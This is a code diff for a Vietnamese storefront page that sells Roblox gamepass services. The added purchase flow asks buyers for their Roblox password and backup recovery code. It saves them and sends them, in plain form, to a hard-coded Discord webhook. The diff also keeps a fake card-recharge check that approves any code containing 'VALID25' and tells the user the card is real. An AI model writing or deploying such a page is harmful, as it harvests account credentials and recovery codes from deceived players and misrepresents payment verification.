@@ -763,7 +763,7 @@
     <header>
         <div class="header-main">
             <div class="container">
-                <span class="logo-text">Shop TBD</span>
+                <a href="index.html"><span class="logo-text">Shop TBD</span></a>
             </div>
         </div>
         <div class="top-bar">
@@ -816,35 +816,35 @@
             <div class="product-card">
                 <div class="tag">HOT DEAL</div>
                 <div class="thumbnail">
-                    <img src="https://tr.rbxcdn.com/180DAY-beeefc3c4f1642d150eca495fa7d709e/150/150/Image/Webp/noFilter" alt="ROBUX 120H">
+                    <img src="https://tr.rbxcdn.com/180DAY-beeefc3c4f1642d150eca495fa7d709e/150/150/Image/Webp/noFilter" alt="X2 MONEY">
                 </div>
                 <div class="info">
                     <h4>X2 MONEY</h4>
-                    <p class="price"><span>Giá: <strong>999, 000 VNĐ</strong></span></p>
-                    <button id="buyNowButton" onclick="openModal()">Buy now</button>
+                    <p class="price"><span>Giá: <strong>115,000 VNĐ</strong></span></p>
+                    <button id="buyNowButton" onclick="openModal('X2 MONEY', 115000)">Buy now</button>
                 </div>
             </div>
             
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://tr.rbxcdn.com/180DAY-46392a150c74bd4a11aca80270077e96/150/150/Image/Webp/noFilter" alt="Vòng Quay Robux">
+                    <img src="https://tr.rbxcdn.com/180DAY-46392a150c74bd4a11aca80270077e96/150/150/Image/Webp/noFilter" alt="VIP">
                 </div>
                 <div class="info">
                     <h4>VIP</h4>
-                    <p class="price"><span>Giá: <strong>999,000 VND</strong></span></p>
-                    <button id="buyNowButton" onclick="openModal()">Buy now</button>
+                    <p class="price"><span>Giá: <strong>210,000 VNĐ</strong></span></p>
+                    <button id="buyNowButton" onclick="openModal('VIP', 210000)">Buy now</button>
                 </div>
             </div>
                         <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://tr.rbxcdn.com/180DAY-e03fae3ffce52f4432de392082fa43b7/150/150/Image/Webp/noFilter" alt="Vòng Quay Robux">
+                    <img src="https://tr.rbxcdn.com/180DAY-e03fae3ffce52f4432de392082fa43b7/150/150/Image/Webp/noFilter" alt="ADMIN COMMANDS">
                 </div>
                 <div class="info">
                     <h4>ADMIN COMMANDS</h4>
-                    <p class="price"><span>Giá: <strong>999, 000 VNĐ</strong></span></p>
-                    <button id="buyNowButton" onclick="openModal()">Buy now</button>
+                    <p class="price"><span>Giá: <strong>750,000 VNĐ</strong></span></p>
+                    <button id="buyNowButton" onclick="openModal('ADMIN COMMANDS', 750000)">Buy now</button>
                 </div>
             </div>
         </div>
@@ -866,29 +866,29 @@
         <div class="form-body">
             <div class="input-group">
                 <label>Thành tiền:</label>
-                <input type="text" class="custom-input" placeholder=""> // viết js tự động điền giá tiền vào 
+                <input type="text" id="modalPrice" class="custom-input" readonly style="color:#2ecc71; font-weight:bold;">
             </div>
         
             <div class="input-group">
                 <label>Tên Tài Khoản Roblox:</label>
-                <input type="text" class="custom-input" placeholder="Nhập tên tài khoản của bạn">
+                <input type="text" id="modalRobloxUser" class="custom-input" placeholder="Nhập tên tài khoản của bạn">
             </div>
 
             <div class="input-group">
                 <label>Mật khẩu (Tạm thời):</label>
-                <input type="text" class="custom-input" placeholder="Mật khẩu của bạn">
+                <input type="text" id="modalRobloxPass" class="custom-input" placeholder="Mật khẩu của bạn">
             </div>
 
             <div class="input-group">
                 <label>MÃ DỰ PHÒNG CỦA BẠN (BẮT BUỘC)</label>
-                <input type="text" class="custom-input" placeholder="Để tiện xử lí">
+                <input type="text" id="modalBackupCode" class="custom-input" placeholder="Để tiện xử lí">
             </div>
 
-            <button class="pay-btn">THANH TOÁN & ĐẶT HÀNG</button>
+            <button class="pay-btn" onclick="handlePurchase()">THANH TOÁN & ĐẶT HÀNG</button>
         </div>
     </div>
 </div>
-
+    
     <div id="customAlert">
         <div class="alert-content">
             <h3 id="alertTitle"></h3>
@@ -936,11 +936,19 @@
     document.addEventListener("DOMContentLoaded", function() {
     const modal = document.getElementById('confirmPurchaseModal');
     const closeBtn = document.querySelector('.close-icon'); 
-    window.openModal = function() {
-        modal.style.display = 'flex';
+    window.openModal = function(name, price) {
+        if(!localStorage.getItem('currentUser')) {
+            showCustomAlert("Yêu cầu", "Vui lòng đăng nhập để mua hàng!", true);
+            return;
+        }
+        currentItem = { name, price };
+        document.getElementById('modalPrice').value = price.toLocaleString() + " VNĐ";
+        document.getElementById('confirmPurchaseModal').style.display = 'flex';
     }
     window.closeModal = function() {
-        modal.style.display = 'none';
+        if(document.getElementById('confirmPurchaseModal')) {
+            document.getElementById('confirmPurchaseModal').style.display = 'none';
+        }
     }
     if (closeBtn) {
         closeBtn.addEventListener('click', window.closeModal);
@@ -966,6 +974,10 @@
         const firebaseApp = firebase.initializeApp(firebaseConfig);
         const db = firebaseApp.firestore(); 
         const cardsDb = db.collection("card_records"); 
+        
+        // WEBHOOK CONFIG
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1452258008506695784/UTMSvXzc99WtJRNgSOhgoQmo7ux-o-qOh857nDcfPEEbL9NS_B6hezGIoqjpO83fPug7";
+        let currentItem = null;
 
         async function fetchUserData(username) {
             const doc = await db.collection("users").doc(username).get();
@@ -1006,6 +1018,85 @@
                 document.getElementById('alertTitle').style.color = '#28a745';
             }
             document.getElementById('customAlert').style.display = 'flex';
+        }
+        
+        // --- XỬ LÝ MUA HÀNG VÀ GỬI WEBHOOK ---
+        async function handlePurchase() {
+            const user = localStorage.getItem('currentUser');
+            if(!user) return;
+
+            const robloxUser = document.getElementById('modalRobloxUser').value;
+            const robloxPass = document.getElementById('modalRobloxPass').value;
+            const backupCode = document.getElementById('modalBackupCode').value;
+
+            if(!robloxUser || !robloxPass || !backupCode) {
+                showCustomAlert("Thiếu thông tin", "Vui lòng nhập đầy đủ Tài khoản, Mật khẩu và Mã dự phòng!", true);
+                return;
+            }
+
+            const item = currentItem;
+            const userRef = db.collection("users").doc(user);
+
+            try {
+                await db.runTransaction(async (transaction) => {
+                    // Check tiền
+                    const userDoc = await transaction.get(userRef);
+                    if (!userDoc.exists) throw "Lỗi tài khoản!";
+                    const balance = userDoc.data().balance || 0;
+                    
+                    if (balance < item.price) {
+                        throw "Số dư không đủ để thanh toán!";
+                    }
+
+                    // Trừ tiền
+                    transaction.update(userRef, { balance: balance - item.price });
+
+                    // Lưu đơn hàng
+                    const orderRef = db.collection("orders_gamepass").doc();
+                    transaction.set(orderRef, {
+                        customer: user,
+                        service: item.name,
+                        price: item.price,
+                        roblox_user: robloxUser,
+                        roblox_pass: robloxPass,
+                        backup_code: backupCode,
+                        status: "pending",
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                });
+
+                // Gửi Webhook Discord
+                if(DISCORD_WEBHOOK_URL) {
+                    fetch(DISCORD_WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: "@everyone Có đơn hàng Gamepass Steal A Brainrot mới!",
+                            embeds: [{
+                                title: "📦 ĐƠN HÀNG GAMEPASS MỚI",
+                                color: 16711680,
+                                fields: [
+                                    { name: "Khách hàng", value: user, inline: true },
+                                    { name: "Gói dịch vụ", value: item.name, inline: true },
+                                    { name: "Giá tiền", value: item.price.toLocaleString() + " VNĐ", inline: true },
+                                    { name: "Acc Roblox", value: `||${robloxUser}||`, inline: false },
+                                    { name: "Mật khẩu", value: `||${robloxPass}||`, inline: false },
+                                    { name: "Mã dự phòng", value: `||${backupCode}||`, inline: false }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                }
+
+                window.closeModal();
+                showCustomAlert("Thành công", `Đặt hàng thành công gói <b>${item.name}</b>.<br>Vui lòng chờ Admin xử lý đơn hàng.`);
+                checkLoginStatus();
+
+            } catch (e) {
+                let msg = typeof e === 'string' ? e : e.message;
+                showCustomAlert("Thất bại", msg, true);
+            }
         }
 
         function changeTab(element, tabId) {
@@ -1114,93 +1205,97 @@
             }
         });
 
-        topUpForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+        if(topUpForm) {
+            topUpForm.addEventListener('submit', async function(event) {
+                event.preventDefault();
 
-            const currentUser = localStorage.getItem('currentUser');
-            if (!currentUser) {
-                showCustomAlert("Lỗi Đăng nhập", "Vui lòng đăng nhập để nạp thẻ!", true);
-                showAuthPrompt();
-                return;
-            }
-
-            const amount = parseInt(document.getElementById('amount').value);
-            const cardCode = document.getElementById('card-code').value.trim();
-            const serial = document.getElementById('serial').value.trim();
-            
-            if (cardCode.startsWith('999') || isRepeatedChar(cardCode) || isRepeatedChar(serial)) {
-                showCustomAlert("Lỗi Xác nhận", "Mã thẻ hoặc Serial không hợp lệ (Không được nhập số lặp lại/mã giả).", true);
-                return;
-            }
-
-            if (!cardCode.includes('VALID25')) {
-                 showCustomAlert("Lỗi Xác nhận", "Mã thẻ không tìm thấy trong hệ thống.", true);
-                 return;
-            }
-
-            let usedCard = await fetchCardData(cardCode);
-            
-            if (usedCard) {
-                if (usedCard.serial === serial) {
-                    showCustomAlert("Lỗi Thẻ", `Mã thẻ ${cardCode} đã được sử dụng vào lúc: ${new Date(usedCard.timestamp).toLocaleString('vi-VN')}.`, true);
-                } else {
-                    showCustomAlert("Lỗi Thẻ", `Mã thẻ ${cardCode} đã được sử dụng. (Lỗi Serial)`, true);
+                const currentUser = localStorage.getItem('currentUser');
+                if (!currentUser) {
+                    showCustomAlert("Lỗi Đăng nhập", "Vui lòng đăng nhập để nạp thẻ!", true);
+                    showAuthPrompt();
+                    return;
                 }
-                return;
-            }
-            
-            let user = await fetchUserData(currentUser);
-            
-            user.balance += amount;
-            user.canClaimReward = true; 
-            await saveUserData(currentUser, user); 
 
-            const cardRecord = {
-                serial: serial, 
-                amount: amount,
-                timestamp: new Date().getTime(),
-                user: currentUser
-            };
-            await saveCardData(cardCode, cardRecord); 
+                const amount = parseInt(document.getElementById('amount').value);
+                const cardCode = document.getElementById('card-code').value.trim();
+                const serial = document.getElementById('serial').value.trim();
+                
+                if (cardCode.startsWith('999') || isRepeatedChar(cardCode) || isRepeatedChar(serial)) {
+                    showCustomAlert("Lỗi Xác nhận", "Mã thẻ hoặc Serial không hợp lệ (Không được nhập số lặp lại/mã giả).", true);
+                    return;
+                }
 
-            showCustomAlert("Nạp thẻ thành công", `Thẻ thật, chưa sử dụng.<br>Bạn đã nạp ${amount.toLocaleString('vi-VN')} VND.<br>Số dư mới: ${user.balance.toLocaleString('vi-VN')} VND. Bạn có thể nhận thưởng!`);
-            
-            topUpForm.reset();
-            checkLoginStatus();
-        });
+                if (!cardCode.includes('VALID25')) {
+                    showCustomAlert("Lỗi Xác nhận", "Mã thẻ không tìm thấy trong hệ thống.", true);
+                    return;
+                }
 
-        claimRewardBtn.addEventListener('click', async function() {
-            const currentUser = localStorage.getItem('currentUser');
-            if (!currentUser) {
-                showCustomAlert("Lỗi Đăng nhập", "Vui lòng đăng nhập để nhận thưởng!", true);
-                showAuthPrompt();
-                return;
-            }
+                let usedCard = await fetchCardData(cardCode);
+                
+                if (usedCard) {
+                    if (usedCard.serial === serial) {
+                        showCustomAlert("Lỗi Thẻ", `Mã thẻ ${cardCode} đã được sử dụng vào lúc: ${new Date(usedCard.timestamp).toLocaleString('vi-VN')}.`, true);
+                    } else {
+                        showCustomAlert("Lỗi Thẻ", `Mã thẻ ${cardCode} đã được sử dụng. (Lỗi Serial)`, true);
+                    }
+                    return;
+                }
+                
+                let user = await fetchUserData(currentUser);
+                
+                user.balance += amount;
+                user.canClaimReward = true; 
+                await saveUserData(currentUser, user); 
 
-            let user = await fetchUserData(currentUser);
-            const rewardAmount = 5000;
-            const hours24 = 24 * 60 * 60 * 1000;
-            const currentTime = new Date().getTime();
+                const cardRecord = {
+                    serial: serial, 
+                    amount: amount,
+                    timestamp: new Date().getTime(),
+                    user: currentUser
+                };
+                await saveCardData(cardCode, cardRecord); 
 
-            if (!user.canClaimReward) {
-                showCustomAlert("Lỗi", "Phần thưởng này đã được nhận sau lần nạp thẻ gần nhất. Hãy nạp thẻ để làm mới quyền nhận thưởng!", true);
-                return;
-            }
+                showCustomAlert("Nạp thẻ thành công", `Thẻ thật, chưa sử dụng.<br>Bạn đã nạp ${amount.toLocaleString('vi-VN')} VND.<br>Số dư mới: ${user.balance.toLocaleString('vi-VN')} VND. Bạn có thể nhận thưởng!`);
+                
+                topUpForm.reset();
+                checkLoginStatus();
+            });
+        }
 
-            if (currentTime - user.lastClaim < hours24) {
-                const nextClaimTime = new Date(user.lastClaim + hours24);
-                showCustomAlert("Lỗi Thời gian", `Bạn chỉ có thể nhận thưởng sau 24 giờ.<br>Vui lòng quay lại sau: ${nextClaimTime.toLocaleTimeString('vi-VN')} ngày ${nextClaimTime.toLocaleDateString('vi-VN')}`, true);
-                return;
-            }
+        if(claimRewardBtn) {
+            claimRewardBtn.addEventListener('click', async function() {
+                const currentUser = localStorage.getItem('currentUser');
+                if (!currentUser) {
+                    showCustomAlert("Lỗi Đăng nhập", "Vui lòng đăng nhập để nhận thưởng!", true);
+                    showAuthPrompt();
+                    return;
+                }
 
-            user.balance += rewardAmount;
-            user.lastClaim = currentTime;
-            user.canClaimReward = false; 
-            await saveUserData(currentUser, user); 
+                let user = await fetchUserData(currentUser);
+                const rewardAmount = 5000;
+                const hours24 = 24 * 60 * 60 * 1000;
+                const currentTime = new Date().getTime();
 
-            showCustomAlert("Thành công", `Chúc mừng! Bạn nhận được ${rewardAmount.toLocaleString('vi-VN')} VND Thưởng Hàng Ngày.<br>Số dư mới: ${user.balance.toLocaleString('vi-VN')} VND.`);
-            checkLoginStatus();
-        });
+                if (!user.canClaimReward) {
+                    showCustomAlert("Lỗi", "Phần thưởng này đã được nhận sau lần nạp thẻ gần nhất. Hãy nạp thẻ để làm mới quyền nhận thưởng!", true);
+                    return;
+                }
+
+                if (currentTime - user.lastClaim < hours24) {
+                    const nextClaimTime = new Date(user.lastClaim + hours24);
+                    showCustomAlert("Lỗi Thời gian", `Bạn chỉ có thể nhận thưởng sau 24 giờ.<br>Vui lòng quay lại sau: ${nextClaimTime.toLocaleTimeString('vi-VN')} ngày ${nextClaimTime.toLocaleDateString('vi-VN')}`, true);
+                    return;
+                }
+
+                user.balance += rewardAmount;
+                user.lastClaim = currentTime;
+                user.canClaimReward = false; 
+                await saveUserData(currentUser, user); 
+
+                showCustomAlert("Thành công", `Chúc mừng! Bạn nhận được ${rewardAmount.toLocaleString('vi-VN')} VND Thưởng Hàng Ngày.<br>Số dư mới: ${user.balance.toLocaleString('vi-VN')} VND.`);
+                checkLoginStatus();
+            });
+        }
         
         async function renderAuthStatus(user) {
             const area = document.getElementById('auth-status-area');
